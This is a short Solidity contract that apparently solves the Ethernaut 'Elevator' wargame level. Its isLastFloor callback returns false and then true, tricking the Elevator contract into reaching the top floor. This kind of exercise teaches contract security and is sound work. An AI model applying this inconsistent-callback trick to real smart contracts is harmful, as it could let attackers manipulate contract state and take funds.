pragma solidity ^0.8.0;

import "./Elevator.sol";
import "hardhat/console.sol";

contract BuildingImpl is Building {
    address elevatorContract;
    uint8 counter;
    uint256 constant TOP = 8;

    constructor(address _elevatorContract) {
        elevatorContract = _elevatorContract;
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (counter == 0) {
            counter++;
            return false;
        }

        counter = 0;
        return true;
    }

    function goToTop() public {
        bytes memory goToArguments = abi.encodeWithSignature(
            "goTo(uint256)",
            TOP
        );
        (bool success, ) = address(elevatorContract).call(goToArguments);

        require(success, "elevator was not called");
        uint256 currentFloor = Elevator(elevatorContract).floor();

        console.log(currentFloor);

        require(currentFloor == TOP, "not at the top");
    }
}
